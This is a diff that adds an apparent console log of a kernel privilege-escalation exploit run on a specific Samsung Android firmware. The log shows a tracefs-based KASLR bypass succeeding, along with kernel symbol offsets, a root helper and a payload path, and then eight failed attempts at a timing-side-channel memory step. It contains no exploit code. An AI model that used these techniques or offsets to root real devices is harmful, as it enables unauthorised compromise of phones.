@@ -1,0 +1,269 @@
+[app] root helper=/data/local/tmp/dm3q-root
+[app] loading verified payload=/data/local/tmp/ksu-payload
+[32m[+] [0mpreload supervisor pid=21822 attempts=8 base_delay=20000 p0_timeout=45 timeout=120
+[32m[+] [0mexploit attempt=1/8 pid=21823 delay=25000 p0_offset=scan
+[32m[+] [0mstartup context pid=21823 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=21823 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=21823 label=dm3q-S918WVLS6CYB3-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=21823 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001cbdd8e bootid_data=ffffff8002a7e728 init_task=ffffff8002ac8740 root_tg=ffffff8002b77ac0 sysctl_bootid=ffffff8002ced429
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00008000 hits=179
+[33m[*] [0mslide tracefs raw summary pages=6 bytes=24576 events=266 callers=266 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=21823 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0monly found 2 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=439 mean=18 n=81918
+[31m[-] [0monly found 3 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=434 mean=18 n=81918
+[33m[*] [0mcontrolled mm group opened attempt=3 group=0 base=ffffff8841140000 hint=0
+[33m[*] [0mcontrolled mm group attempt=3 group=0 base=ffffff8841140000 slot=10 count=1 hint=0
+[31m[-] [0mexploit attempt=1/8 timeout pid=21823 seconds=120
+[31m[-] [0mexploit attempt=1/8 terminated signal=9
+[33m[*] [0msafe retry quiet delay seconds=5
+[32m[+] [0mexploit attempt=2/8 pid=23821 delay=20000 p0_offset=scan
+[32m[+] [0mstartup context pid=23821 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=23821 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=23821 label=dm3q-S918WVLS6CYB3-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=23821 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001cbdd8e bootid_data=ffffff8002a7e728 init_task=ffffff8002ac8740 root_tg=ffffff8002b77ac0 sysctl_bootid=ffffff8002ced429
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081149c4 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081de110 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081149c4 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00008000 hits=160
+[33m[*] [0mslide tracefs raw summary pages=4 bytes=16384 events=229 callers=229 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=23821 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0monly found 0 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=438 mean=18 n=81918
+[31m[-] [0monly found 0 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=424 mean=18 n=81918
+[31m[-] [0monly found 1 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=437 mean=18 n=81918
+[31m[-] [0mexploit attempt=2/8 timeout pid=23821 seconds=120
+[31m[-] [0mexploit attempt=2/8 terminated signal=9
+[33m[*] [0msafe retry quiet delay seconds=5
+[32m[+] [0mexploit attempt=3/8 pid=25418 delay=30000 p0_offset=scan
+[32m[+] [0mstartup context pid=25418 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=25418 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=25418 label=dm3q-S918WVLS6CYB3-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=25418 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001cbdd8e bootid_data=ffffff8002a7e728 init_task=ffffff8002ac8740 root_tg=ffffff8002b77ac0 sysctl_bootid=ffffff8002ced429
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081149c4 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081149c4 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00008000 hits=159
+[33m[*] [0mslide tracefs raw summary pages=4 bytes=16384 events=229 callers=229 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=25418 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0monly found 2 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=16 max=426 mean=18 n=81918
+[31m[-] [0monly found 3 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=16 max=438 mean=18 n=81918
+[31m[-] [0monly found 2 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=16 max=437 mean=18 n=81918
+[31m[-] [0mexploit attempt=3/8 timeout pid=25418 seconds=120
+[31m[-] [0mexploit attempt=3/8 terminated signal=9
+[33m[*] [0msafe retry quiet delay seconds=5
+[32m[+] [0mexploit attempt=4/8 pid=27325 delay=50000 p0_offset=scan
+[32m[+] [0mstartup context pid=27325 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=27325 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=27325 label=dm3q-S918WVLS6CYB3-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=27325 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001cbdd8e bootid_data=ffffff8002a7e728 init_task=ffffff8002ac8740 root_tg=ffffff8002b77ac0 sysctl_bootid=ffffff8002ced429
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00008000 hits=166
+[33m[*] [0mslide tracefs raw summary pages=4 bytes=16384 events=228 callers=228 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=27325 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0monly found 2 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=19 threshold=190 min=16 max=430 mean=18 n=81918
+[31m[-] [0monly found 1 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=19 threshold=190 min=16 max=430 mean=18 n=81918
+[31m[-] [0monly found 0 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=19 threshold=190 min=17 max=431 mean=18 n=81918
+[31m[-] [0mexploit attempt=4/8 timeout pid=27325 seconds=120
+[31m[-] [0mexploit attempt=4/8 terminated signal=9
+[33m[*] [0msafe retry quiet delay seconds=5
+[32m[+] [0mexploit attempt=5/8 pid=29272 delay=15000 p0_offset=scan
+[32m[+] [0mstartup context pid=29272 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=29272 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=29272 label=dm3q-S918WVLS6CYB3-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=29272 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001cbdd8e bootid_data=ffffff8002a7e728 init_task=ffffff8002ac8740 root_tg=ffffff8002b77ac0 sysctl_bootid=ffffff8002ced429
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0017155b8 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0017155b8 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00008000 hits=157
+[33m[*] [0mslide tracefs raw summary pages=4 bytes=16384 events=220 callers=220 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=29272 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0monly found 1 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=19 threshold=190 min=17 max=434 mean=18 n=81918
+[31m[-] [0monly found 1 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=19 threshold=190 min=17 max=435 mean=18 n=81918
+[31m[-] [0monly found 3 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=19 threshold=190 min=17 max=429 mean=18 n=81918
+[31m[-] [0mexploit attempt=5/8 timeout pid=29272 seconds=120
+[31m[-] [0mexploit attempt=5/8 terminated signal=9
+[33m[*] [0msafe retry quiet delay seconds=5
+[32m[+] [0mexploit attempt=6/8 pid=31023 delay=40000 p0_offset=scan
+[32m[+] [0mstartup context pid=31023 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=31023 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=31023 label=dm3q-S918WVLS6CYB3-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=31023 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001cbdd8e bootid_data=ffffff8002a7e728 init_task=ffffff8002ac8740 root_tg=ffffff8002b77ac0 sysctl_bootid=ffffff8002ced429
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00008000 hits=173
+[33m[*] [0mslide tracefs raw summary pages=4 bytes=16384 events=251 callers=251 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=31023 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0monly found 0 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=16 max=436 mean=18 n=81918
+[33m[*] [0mcontrolled mm group opened attempt=2 group=0 base=ffffff8841140000 hint=0
+[33m[*] [0mcontrolled mm group attempt=2 group=0 base=ffffff8841140000 slot=5 count=1 hint=0
+[31m[-] [0monly found 0 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=16 max=438 mean=18 n=32766
+[31m[-] [0monly found 3 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=16 max=432 mean=18 n=81918
+[31m[-] [0mexploit attempt=6/8 timeout pid=31023 seconds=120
+[31m[-] [0mexploit attempt=6/8 terminated signal=9
+[33m[*] [0msafe retry quiet delay seconds=5
+[32m[+] [0mexploit attempt=7/8 pid=1324 delay=35000 p0_offset=scan
+[32m[+] [0mstartup context pid=1324 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=1324 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=1324 label=dm3q-S918WVLS6CYB3-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=1324 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001cbdd8e bootid_data=ffffff8002a7e728 init_task=ffffff8002ac8740 root_tg=ffffff8002b77ac0 sysctl_bootid=ffffff8002ced429
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00008000 hits=170
+[33m[*] [0mslide tracefs raw summary pages=4 bytes=16384 events=234 callers=234 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=1324 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0monly found 0 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=434 mean=18 n=81918
+[31m[-] [0monly found 1 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=446 mean=18 n=81918
+[31m[-] [0monly found 1 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=438 mean=18 n=81918
+[31m[-] [0mexploit attempt=7/8 timeout pid=1324 seconds=120
+[31m[-] [0mexploit attempt=7/8 terminated signal=9
+[33m[*] [0msafe retry quiet delay seconds=5
+[32m[+] [0mexploit attempt=8/8 pid=4320 delay=45000 p0_offset=scan
+[32m[+] [0mstartup context pid=4320 uid=2000 euid=2000 gid=2000 egid=2000 attr=u:r:shell:s0 enforce=1
+[32m[+] [0mstartup limits pid=4320 NoNewPrivs=0 Seccomp=0 Seccomp_filters=0
+[32m[+] [0mbuild config pid=4320 label=dm3q-S918WVLS6CYB3-tracefs-shaped-configfs-pipe-root stack_writer=mcast reclaim=controlled fops=direct pipe=after-fops
+[32m[+] [0mp0 profile pid=4320 phys_offset=0000000080000000 kernel_phys_load=0000000080080000 delta=0000000000080000 slide_logger=ffffff8001cbdd8e bootid_data=ffffff8002a7e728 init_task=ffffff8002ac8740 root_tg=ffffff8002b77ac0 sysctl_bootid=ffffff8002ced429
+[33m[*] [0mslide source mode=tracefs
+[33m[*] [0mslide tracefs state tracing=0 event=0 id=108
+[33m[*] [0mslide tracefs trigger vforks=96 child_sleep_us=1000
+[33m[*] [0mslide tracefs trigger bytes=4194304
+[33m[*] [0mslide tracefs trigger result vfork=1 io=1
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081149c4 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081149c4 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0081149c4 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs raw caller=ffffffc0080d07a0 event=108 len=32
+[33m[*] [0mslide tracefs candidate=00008000 hits=157
+[33m[*] [0mslide tracefs raw summary pages=4 bytes=16384 events=221 callers=221 parse_fail=0 candidates=1 cpu_files=8
+[33m[*] [0mslide tracefs restore tracing=0 event=0 ok=1
+[32m[+] [0mslide tracefs caller gate candidate=00008000
+[32m[+] [0mslide-kaslr-ok source=tracefs pid=4320 base=ffffffc008008000 slide=0000000000008000 data_mode=canonical
+[33m[*] [0mcontrolled mm group search scans=256 objects=32 dma32_skip=8
+[31m[-] [0monly found 0 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=441 mean=18 n=81918
+[31m[-] [0monly found 0 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=435 mean=18 n=81918
+[31m[-] [0monly found 2 collisions -> cannot continue
+[31m[-] [0mksnitch timing diag approx_time=18 threshold=180 min=17 max=442 mean=18 n=81918
+[31m[-] [0mexploit attempt=8/8 timeout pid=4320 seconds=120
+[31m[-] [0mexploit attempt=8/8 terminated signal=9
+[31m[!] [0mexploit failed after 8 independent attempts
